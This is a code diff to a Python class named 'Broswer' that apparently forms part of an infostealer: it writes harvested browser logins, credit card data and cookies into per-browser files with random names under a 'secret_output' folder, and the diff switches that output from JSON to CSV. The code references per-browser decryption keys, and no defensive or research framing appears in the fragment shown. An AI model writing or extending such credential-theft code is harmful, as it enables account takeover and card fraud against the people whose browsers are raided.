@@ -177,38 +177,38 @@ class Broswer:
         if self.logins:
             for login in self.logins:
                 content_type = login["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
                 browser_path = secret_output / login["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
                     
                 login_path = browser_path / content_type
-                write_dict_to_json(login_path, login["data"])
+                write_dict_to_csv(login_path, login["data"])
                 
         # write self.logins to the output file
         print_info("Writing credit cards info to a file")
         if self.credit_cards:
             for credit_card in self.credit_cards:
                 content_type = credit_card["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
                 browser_path = secret_output / credit_card["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
                     
                 credit_card_path = browser_path / content_type
-                write_dict_to_json(credit_card_path, credit_card["data"])
+                write_dict_to_csv(credit_card_path, credit_card["data"])
                 
         # write self.logins to the output file
         print_info("Writing cookies to a file")    
         if self.cookies:
             for cookie in self.cookies:
                 content_type = cookie["content_type"] + "_"
-                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".json"
+                content_type += "".join(random.choices(string.ascii_lowercase, k=4)) + ".csv"
                 browser_path = secret_output / cookie["browser"] 
                 if not browser_path.exists():
                     browser_path.mkdir(parents=True, exist_ok=True)
                 cookie_path = browser_path / content_type
-                write_dict_to_json(cookie_path, cookie["data"])
+                write_dict_to_csv(cookie_path, cookie["data"])
                      
     def browse_browser_data(self):
         # Read browser logins, credit_cards, and cookies
@@ -273,32 +273,15 @@ class Broswer:
                     print(f"[-] browser_name= {browser_name} is not in  self.decrypt_keys={self.decrypt_keys}")
 
 
-def convert_bytes_to_str(data):
-    def convert(value):
-        if isinstance(value, bytes):
-            return value.hex()  # Возвращаем строковое hex представление байтов
-        return value
-
-    def traverse_and_convert(d):
-        if isinstance(d, dict):
-            return {k: traverse_and_convert(v) for k, v in d.items()}
-        elif isinstance(d, list):
-            return [traverse_and_convert(item) for item in d]
-        else:
-            return convert(d)
-
-    return traverse_and_convert(data)
-
-
-# Функция для записи данных в JSON файл
-def write_dict_to_json(filename, dict_data):
+def write_dict_to_csv(filename, dict_data):
+    #print(dict_data)
     if dict_data:
-        # Преобразование всех полей типа bytes
-        dict_data = convert_bytes_to_str(dict_data)
-
         print_debug(f"Writing {filename}")
-        with open(filename, "w") as f:
-            json.dump(dict_data, f, indent=4, ensure_ascii=False)
+        with open(filename, "w", newline="") as f:
+            writer = csv.DictWriter(f, fieldnames=dict_data[0].keys())
+            writer.writeheader()
+            for d in dict_data:
+                writer.writerow(d)
               
 def run_command(command):
     cmd = shlex.split(command)
